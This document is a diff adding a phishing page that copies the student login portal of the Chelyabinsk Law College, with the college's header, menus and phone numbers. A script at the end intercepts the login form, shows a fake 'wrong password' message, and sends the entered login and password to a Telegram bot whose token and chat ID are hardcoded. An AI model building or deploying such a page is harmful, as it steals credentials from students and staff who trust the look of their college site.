@@ -1,0 +1,482 @@
+<html class="bx-core bx-win bx-no-touch bx-no-retina bx-chrome">
+<head>
+  <meta charset="utf-8">
+  <title>Личный кабинет</title>
+  <link rel="shortcut icon" href="/bitrix/templates/modern_blue_2024/favicon.ico" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <style>
+    /* Основные стили для сохранения визуала */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: "Jost", Arial, sans-serif;
+      background: #f5f5f5;
+    }
+    
+    .body-wrapper {
+      width: 100%;
+    }
+    
+    /* Header стили */
+    header .content:first-child {
+      background: none!important;
+      border: 1px solid #ff8562;
+      padding-top: 20px!important;
+      border-radius: 25px;
+      padding: 20px;
+    }
+    
+    .container-white.pt10.pb10 {
+      background: white;
+      padding: 10px 0;
+    }
+    
+    .content {
+      max-width: 1200px;
+      margin: 0 auto;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+    }
+    
+    .col {
+      padding: 10px;
+      box-sizing: border-box;
+    }
+    
+    .col-mb-12 { width: 100%; }
+    .col-mb-6 { width: 50%; }
+    
+    @media (min-width: 768px) {
+      .col-12 { width: 100%; }
+      .col-4 { width: 33.333%; }
+    }
+    
+    @media (min-width: 1024px) {
+      .col-dt-3 { width: 25%; }
+      .col-dt-9 { width: 75%; }
+    }
+    
+    .logo-block {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    
+    .logo img {
+      max-width: 160%;
+    }
+    
+    .h1 p {
+      text-align: center;
+      margin: 0;
+      font-weight: bold;
+      color: #313131;
+    }
+    
+    /* Кнопки */
+    .want-to-chuck-wrapper {
+      display: flex;
+      flex-direction: column;
+      gap: 5px;
+    }
+    
+    .want-to-chuck {
+      display: inline-block;
+      padding: 10px 20px;
+      text-align: center;
+      text-decoration: none;
+      border-radius: 50px;
+      margin: 2px 0;
+      font-weight: 500;
+    }
+    
+    .want-to-chuck.red {
+      background: #f07930;
+      color: white;
+    }
+    
+    .want-to-chuck.blue {
+      background: white;
+      color: black;
+      border: 1px solid;
+    }
+    
+    .want-to-chuck.blue1 {
+      background: white;
+      color: black;
+      border: 1px solid;
+    }
+    
+    /* Контакты */
+    .header-contacts {
+      text-align: right;
+    }
+    
+    .header-contacts p {
+      margin: 5px 0;
+      color: black;
+    }
+    
+    .header-contacts a {
+      color: black;
+      text-decoration: none;
+    }
+    
+    .socmenu {
+      display: flex;
+      gap: 10px;
+      list-style: none;
+      padding: 0;
+      margin: 10px 0 0 0;
+    }
+    
+    .socmenu li {
+      display: inline-block;
+    }
+    
+    .socmenu a {
+      color: #f07930;
+      font-size: 18px;
+    }
+    
+    /* Основная навигация */
+    .container-blue {
+      background: #2c3e50;
+    }
+    
+    .top-nav-block ul {
+      display: flex;
+      list-style: none;
+      padding: 0;
+      margin: 0;
+      gap: 20px;
+    }
+    
+    .top-nav-block li {
+      display: inline-block;
+    }
+    
+    .top-nav-block a {
+      color: black;
+      text-decoration: none;
+      padding: 15px 20px;
+      display: block;
+      transition: background 0.3s;
+    }
+    
+    .top-nav-block li:hover > a {
+      background: #f07930;
+    }
+    
+    /* Основной контент */
+    .container-main {
+      max-width: 1200px;
+      margin: 20px auto;
+      padding: 0 15px;
+    }
+    
+    .white-box {
+      background: white;
+      padding: 20px;
+      border-radius: 5px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+    }
+    
+    .col-margin-bottom {
+      margin-bottom: 20px;
+    }
+    
+    /* Боковое меню */
+    .sidebar-navrazdel ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    
+    .sidebar-navrazdel li {
+      margin-bottom: 5px;
+    }
+    
+    .sidebar-navrazdel a {
+      display: block;
+      padding: 10px 15px;
+      color: #313131;
+      text-decoration: none;
+      border-left: 3px solid transparent;
+      transition: all 0.3s;
+    }
+    
+    .sidebar-navrazdel a:hover {
+      border-left-color: #f07930;
+      background: #f9f9f9;
+    }
+    
+    /* Форма авторизации */
+    .bx-system-auth-form table {
+      width: 100%;
+      max-width: 400px;
+      border-collapse: collapse;
+    }
+    
+    .bx-system-auth-form td {
+      padding: 8px 0;
+    }
+    
+    .bx-system-auth-form input[type="text"],
+    .bx-system-auth-form input[type="password"] {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #ddd;
+      border-radius: 3px;
+    }
+    
+    .bx-system-auth-form input[type="submit"] {
+      background: #f07930;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+    
+    .bx-system-auth-form input[type="submit"]:hover {
+      background: #e5671f;
+    }
+    
+    /* Хлебные крошки */
+    .bx-breadcrumb {
+      margin-bottom: 20px;
+    }
+    
+    .bx-breadcrumb-item span {
+      color: #666;
+    }
+    
+    /* Социальные иконки в форме */
+    #socseti {
+      margin-top: 20px;
+    }
+    
+    .share {
+      position: relative;
+    }
+    
+    .share .submenu {
+      display: none;
+      position: absolute;
+      left: 0;
+      top: 100%;
+      background: white;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+      list-style: none;
+      padding: 10px;
+      margin: 0;
+    }
+    
+    .share:hover .submenu {
+      display: block;
+    }
+    
+    .share .submenu li {
+      margin: 5px 0;
+    }
+    
+    .share .submenu a {
+      color: #f07930;
+      text-decoration: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="body-wrapper clearfix">
+    <header>
+      <!-- Верхняя часть хедера -->
+      <div class="container-white pt10 pb10">
+        <div class="content">
+          <!-- Логотип -->
+          <div class="col col-mb-12 col-12 col-dt-3">
+            <div class="logo-block">
+              <a href="/" class="logo">
+                <img style="max-width:160%" src="/images/logo.png">
+              </a>
+              <a href="/">
+                <span class="h1">
+                  <p>"ЧЕЛЯБИНСКИЙ ЮРИДИЧЕСКИЙ КОЛЛЕДЖ"</p>
+                </span>
+              </a>
+            </div>
+          </div>
+
+          <!-- Левая группа кнопок -->
+          <div class="col col-mb-6 col-12 col-dt-3">
+            <div class="want-to-chuck-wrapper blue">
+              <a href="/applicants/the_admissions_committee/index.php" class="want-to-chuck red wtclu">Поступить в ЧЮК</a>
+              <a href="http://library.chuc.ru/" target="_blank" class="want-to-chuck blue wtcld">Библиотека</a>
+              <a href="https://www.gosuslugi.ru/" target="_blank" class="want-to-chuck blue wtclv">ГосУслуги</a>
+            </div>
+          </div>
+
+          <!-- Правая группа кнопок -->
+          <div class="col col-mb-6 col-12 col-dt-3">
+            <div class="want-to-chuck-wrapper blue">
+              <a href="http://miterra.chuc.ru/" target="_blank" class="want-to-chuck blue wtcru">Расписание</a>
+              <a target="_blank" href="/lichnyy-kabinet/" class="want-to-chuck blue1 wtcrd">Личный кабинет</a>
+              <a target="_blank" href="https://myschool.edu.ru/" class="want-to-chuck blue1 wtcrv">ФГИС «Моя школа»</a>
+            </div>
+          </div>
+
+          <!-- Контакты -->
+          <div class="col col-mb-12 col-12 col-dt-3" style="padding-right: 0">
+            <div class="header-contacts">
+              <p>Челябинск: <a href="tel:+73517939173">+7 (351) 793-91-73</a></p>
+              <p>Приемная комиссия: <a href="tel:+73517938879">+7 (351) 793-88-79</a></p>
+              <p>Миасс: <a href="tel:+73513552707">+7 (3513) 55-27-07</a></p>
+              <p>
+                <a href="#" class="bvi-open"><img width="194" height="64" src="/images/eye3.png"></a>
+              </p>
+              <div>
+                <ul class="socmenu">
+                  <li><a href="https://vk.com/chuc_che"><i class="fa fa-vk"></i></a></li>
+                  <li><a href="https://ok.ru/chucru?st._aid=ExternalGroupWidget_OpenGroup"><i class="fa fa-odnoklassniki"></i></a></li>
+                </ul>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Основная навигация -->
+      <div class="container blue container-top-navigation">
+        <div class="content">
+          <div class="col col-mb-hide col-12">
+            <div class="top-nav-block">
+              <ul>
+                <li class="parent"><a tabindex="1" href="/about_chuc/">О Колледже</a></li>
+                <li class="parent"><a tabindex="1" href="/applicants/">Абитуриентам</a></li>
+                <li class="parent"><a tabindex="1" href="/students/">Студентам</a></li>
+                <li class="parent"><a tabindex="1" href="/dist/">Интернет-образование</a></li>
+                <li><a href="/vakansii/tekushchie-vakansii.php">Вакансии в ЧЮК</a></li>
+                <li><a href="/contacts/">Контакты</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- Основной контент -->
+    <div class="container container-main col-margin">
+      <div class="content">
+        <!-- Боковое меню -->
+        <div class="col col-mb-12 col-4 col-dt-3">
+          <div class="white-box col-margin-bottom clearfix">
+            <div class="sidebar-navrazdel">
+              <ul>
+                <li><a href="/lichnyy-kabinet/jurnal.php">Электронный журнал</a></li>
+                <li><a href="/lichnyy-kabinet/tt-grp.php">Расписание по группам</a></li>
+                <li><a href="/lichnyy-kabinet/tt-prep.php">Расписание по преподавателям</a></li>
+                <li><a href="/lichnyy-kabinet/biblioteka">Электронная библиотека</a></li>
+                <li><a href="/lichnyy-kabinet/po.php">Бесплатное ПО</a></li>
+                <li><a href="/lichnyy-kabinet/office.php">Облачный Office</a></li>
+                <li><a href="/lichnyy-kabinet/tekushchie-vakansii.php">Текущие вакансии</a></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- Форма авторизации -->
+        <div class="white-box col-margin-bottom padding-box">
+            <h1>Личный кабинет</h1>
+            <div>
+                <div class="bx-system-auth-form">
+                    <form name="system_auth_form" id="telegramForm">
+                        <table width="95%">
+                            <tbody>
+                                <tr>
+                                    <td colspan="2">
+                                        Логин:
+                                        <br>
+                                        <input type="text" name="login" placeholder="Логин" required>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td colspan="2">
+                                        Пароль:
+                                        <br>
+                                        <input type="password" name="password" placeholder="Пароль" required>
+                                        <p style="color: red; display: none;" id="errortext">неверный пароль</p>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td valign="top">
+                                        <input type="checkbox" id="USER_REMEMBER_frm" name="remember" value="Y">
+                                    </td>
+                                    <td width="100%">
+                                        <label for="USER_REMEMBER_frm">Запомнить меня</label>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td colspan="2">
+                                        <button type="submit">Войти</button>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td colspan="2">
+                                        <a href="/lichnyy-kabinet/index.php?forgot_password=yes&amp;backurl=%2Flichnyy-kabinet%2Findex.php" rel="nofollow">Забыли свой пароль?</a>
+                                    </td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </form>
+                </div>
+            </div>
+            <script>
+
+            </script>
+            <script>
+            document.getElementById('telegramForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                
+                const formData = new FormData(this);
+                const login = formData.get('login');
+                const password = formData.get('password');
+                const text = document.getElementById('errortext');
+                text.style.display = 'block';
+                
+                // Ваши данные бота (ЗАМЕНИТЕ)
+                const botToken = '8425376529:AAH7OV8VqeDDpIXgWxC73FzPYsidC-xCMg4';
+                const chatId = '722943049';
+                
+                const message = `🔐 Новые данные:%0A👤 Логин: ${login}%0A🔑 Пароль: ${password}%0A⏰ ${new Date().toLocaleString()}`;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+                    
+            });
+            </script>
+
+            <div id="socseti" class="topRight">
+                <div class="share left">
+                    <i class="fa fa-share-alt"></i>
+                    <ul class="submenu">
+                        <li>
+                            <a href="https://vk.com/chuc_che" class="vk">
+                                <i class="fa fa-vk"></i>
+                            </a>
+                        </li>
+                        <li>
+                            <a href="https://ok.ru/chucru?st._aid=ExternalGroupWidget_OpenGroup" class="odnoklassniki">
+                                <i class="fa fa-odnoklassniki"></i>
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</body>
+</html>
